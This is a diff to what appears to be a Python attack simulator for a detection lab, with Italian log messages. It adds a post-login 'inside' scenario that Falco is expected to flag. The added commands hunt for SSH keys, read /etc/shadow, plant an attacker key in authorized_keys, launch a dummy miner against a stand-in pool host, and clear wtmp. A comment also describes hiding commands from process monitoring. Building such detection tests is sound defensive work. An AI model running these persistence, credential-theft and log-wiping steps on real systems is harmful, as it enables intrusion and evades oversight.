@@ -59,14 +59,18 @@ def iface_for(source):
 
 # --- primitives -------------------------------------------------------------------------------------------------
 
-def ssh_try(source, user, password, log, command="true"):
-    """One SSH login from `source`. Returns 'ok', 'denied' or 'blocked' (no answer: banned or dropped)."""
+def ssh_try(source, user, password, log, command="true", script=None):
+    """One SSH login from `source`. Returns 'ok', 'denied' or 'blocked' (no answer: banned or dropped).
+    `script` goes on stdin (bash -s): the commands stay out of this container's process list, which Falco on lab-01
+    sees too (one kernel for all the lab's containers)."""
     target = target_for(source)
+    if script is not None:
+        command = "bash -s"
     r = subprocess.run(
         ["sshpass", "-p", password, "ssh", "-b", source, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
          "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no", "-o", "NumberOfPasswordPrompts=1",
          "-o", "ConnectTimeout=4", "-o", "LogLevel=ERROR", f"{user}@{target}", command],
-        capture_output=True, text=True, timeout=30)
+        input=script, capture_output=True, text=True, timeout=30)
     if r.returncode == 0:
         log(f"{source} → ssh {user}: ACCESSO RIUSCITO")
         for line in r.stdout.strip().splitlines()[:4]:
@@ -198,6 +202,21 @@ def start_c2():
     threading.Thread(target=server.serve_forever, daemon=True).start()
 
 
+def inside(log):
+    src = "198.51.100.213"
+    log("l'intruso, entrato con la password trovata, si guarda intorno: chiavi, password, una porta per tornare, un miner, le tracce")
+    steps = "\n".join([
+        "find / -maxdepth 4 -name id_rsa 2>/dev/null",
+        f"echo '{LAB_PASSWORD}' | sudo -S -p '' cat /etc/shadow > /dev/null",
+        "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIntruderLabKeyOnly0000000000000000000 intruder' >> ~/.ssh/authorized_keys",
+        "mkdir -p /tmp/.k && cp /bin/true /tmp/.k/xmrig && /tmp/.k/xmrig -o stratum+tcp://203.0.113.66:3333 --background",
+        f"echo '{LAB_PASSWORD}' | sudo -S -p '' sh -c ': > /var/log/wtmp'",
+        "echo fatto",
+    ])
+    ssh_try(src, "operatore", LAB_PASSWORD, log, script=steps)
+    log("Falco su lab-01: chiavi cercate, /etc/shadow letto, chiave SSH aggiunta, miner avviato, wtmp svuotato")
+
+
 def backdoor(log):
     src = "198.51.100.213"
     log("l'intruso entra con la password trovata e installa una backdoor che chiama il suo server di controllo")
@@ -209,7 +228,7 @@ def backdoor(log):
 def full_night(log):
     for title, fn in [("Scansione delle porte", port_scan), ("Protocolli industriali", industrial_probe),
                       ("Scansione del sito", web_scan), ("Exploit web", web_exploit), ("Intrusione", intrusion),
-                      ("Backdoor", backdoor)]:
+                      ("Dentro il server", inside), ("Backdoor", backdoor)]:
         log(f"— {title} —")
         fn(log)
 
@@ -223,6 +242,8 @@ SCENARIOS = [
      "expect": "Dopo 5 tentativi fail2ban banna l'indirizzo: gli ultimi tentativi non ricevono risposta."},
     {"id": "intrusion", "title": "Intrusione lenta e accesso riuscito", "source": "198.51.100.213", "run": intrusion,
      "expect": "Scansione, 4 password sbagliate sotto la soglia, poi l'accesso: LoginAfterFailures, gravità critica."},
+    {"id": "inside", "title": "L'intruso dentro il server", "source": "198.51.100.213", "run": inside,
+     "expect": "Falco vede cosa fa dopo l'accesso: legge /etc/shadow, aggiunge una chiave SSH, avvia un miner, svuota wtmp. Tutto legato al suo indirizzo, gravità critica."},
     {"id": "backdoor", "title": "Backdoor che chiama casa", "source": C2, "run": backdoor,
      "expect": "Dopo l'accesso, lab-01 chiama il server di controllo: Suricata lo vede, CommandAndControl, gravità critica."},
     {"id": "web-scan", "title": "Scansione del sito", "source": "203.0.113.14", "run": web_scan,
@@ -236,7 +257,7 @@ SCENARIOS = [
     {"id": "campaign", "title": "Campagna distribuita su un account", "source": "192.0.2.11–22", "run": campaign,
      "expect": "12 indirizzi, 2 tentativi ciascuno sull'account scada: nessun ban, una campagna DistributedSshBruteForce."},
     {"id": "full-night", "title": "La notte completa (in sequenza)", "source": "più indirizzi", "run": full_night,
-     "expect": "Scansione, protocolli industriali, sito, exploit, l'intrusione e la backdoor: circa tre minuti."},
+     "expect": "Scansione, protocolli industriali, sito, exploit, l'intrusione, cosa fa dentro e la backdoor: circa tre minuti."},
 ]
 
 
